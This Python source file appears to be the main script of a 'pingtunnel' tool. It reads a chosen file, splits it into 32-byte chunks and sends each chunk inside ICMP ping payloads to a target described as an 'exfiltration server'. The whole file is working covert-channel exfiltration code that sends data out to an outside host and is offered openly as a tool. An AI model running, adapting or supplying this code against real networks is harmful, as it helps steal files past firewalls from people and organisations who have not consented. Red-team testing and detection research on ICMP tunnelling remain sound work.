import sys
import math
import argparse

from icmplib import ping

from pingtunnel.Controller import Controller

def round_up(n, decimals=0):
    multiplier = 10 ** decimals
    return math.ceil(n * multiplier) / multiplier

def main(args_=None):
    """The main routine."""
    if args_ is None:
        args_ = sys.argv[1:]

    parser = argparse.ArgumentParser()
    parser.add_argument("--path", "-p", type=str, required=True, help="Path to file to be extraced")
    parser.add_argument("--target", "-t", type=str, required=True, help="IP of exfiltration server")
    parser.add_argument("--interval", "-i", type=float, default=1.0, help="Nr of seconds between pings")
    args = parser.parse_args()

    c = Controller()

    c.printHeader()

    with open(args.path, "rb") as f:
        _bytes = f.read()
        numberOfBytes = len(_bytes)
        numberOfPingRequests = round_up(numberOfBytes / 32)

        print("")
        print("Status")
        print("---")
        print("    Exfiltration Server: " + args.target)
        print(" File to be exfiltrated: " + args.path)
        print("")
        print("  Total Number of Bytes: " + str(numberOfBytes))
        print("Number of Ping Requests: " + str(numberOfPingRequests))
        print(" Interval between Pings: " + str(args.interval) + " seconds")
        print("")
        print("")
        
        print("Execution")
        print("---")

        print("-> Split " + args.path + " in " + str(numberOfPingRequests) + " chunks")
        packages = [_bytes[i:i + 32] for i in range(0, numberOfBytes, 32)]
        
        print("-> Send chunks")
        for p in packages:
            ping(address=args.target, count=1, interval=args.interval, payload=p)

        print("")
        print("")
        print("--> Transmission successful!")
        print("")

    c.printExecutionTime()


if __name__ == "__main__":
    sys.exit(main())
